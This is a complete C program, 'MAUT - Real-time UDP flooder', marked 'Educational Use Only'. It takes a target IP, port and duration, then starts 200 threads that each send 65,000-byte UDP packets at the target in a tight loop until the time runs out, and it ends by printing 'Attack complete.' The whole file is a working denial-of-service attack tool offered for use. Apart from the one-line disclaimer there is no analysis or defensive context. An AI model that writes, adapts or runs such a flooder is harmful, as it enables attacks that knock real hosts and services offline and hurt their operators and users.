// Owner: maut
// Educational Use Only

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <time.h>

#define THREADS 200
#define PACKET_SIZE 65000 // Max safe UDP size for raw flooding

char *target_ip;
int target_port;
int duration;

void *flood(void *arg) {
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(target_port);
    target.sin_addr.s_addr = inet_addr(target_ip);

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) pthread_exit(NULL);

    char *packet = (char *)malloc(PACKET_SIZE);
    memset(packet, 0x41, PACKET_SIZE); // Fill with 'A'

    time_t end = time(NULL) + duration;

    while (time(NULL) < end) {
        sendto(sock, packet, PACKET_SIZE, 0, (struct sockaddr *)&target, sizeof(target));
    }

    close(sock);
    free(packet);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <IP> <PORT> <TIME>\n", argv[0]);
        return 1;
    }

    target_ip = argv[1];
    target_port = atoi(argv[2]);
    duration = atoi(argv[3]);

    pthread_t threads[THREADS];
    printf("Launching MAUT - Real-time UDP flooder\n");
    printf("Target  : %s\n", target_ip);
    printf("Port    : %d\n", target_port);
    printf("Time    : %d seconds\n", duration);
    printf("Threads : %d\n", THREADS);
    printf("Packet  : %d bytes\n\n", PACKET_SIZE);

    for (int i = 0; i < THREADS; i++) {
        pthread_create(&threads[i], NULL, flood, NULL);
    }

    for (int i = 0; i < THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("Attack complete.\n");
    return 0;
}
